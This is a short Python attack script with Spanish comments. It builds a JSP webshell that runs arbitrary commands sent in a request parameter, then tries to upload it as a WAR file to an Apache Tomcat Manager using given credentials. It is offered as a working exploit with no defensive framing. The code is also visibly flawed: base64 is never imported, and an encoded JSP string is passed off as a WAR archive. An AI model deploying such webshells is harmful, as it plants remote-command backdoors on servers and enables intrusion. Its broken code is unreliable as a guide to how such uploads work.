# guardar como exploit_avanzado.py
import requests
import sys

def crear_webshell():
    """Crear webshell JSP para upload"""
    webshell = """<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while(disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
"""
    return base64.b64encode(webshell.encode()).decode()

def exploit_manager(url, user, password):
    """Explotar Tomcat Manager para subir webshell"""
    try:
        # Subir aplicación maliciosa
        headers = {'Content-Type': 'application/octet-stream'}
        files = {'deploy': ('shell.war', crear_webshell())}
        
        response = requests.put(
            f"{url}/manager/deploy",
            auth=(user, password),
            files=files,
            verify=False
        )
        
        if response.status_code == 200:
            print("[+] Webshell desplegada exitosamente")
            return True
    except:
        pass
    return False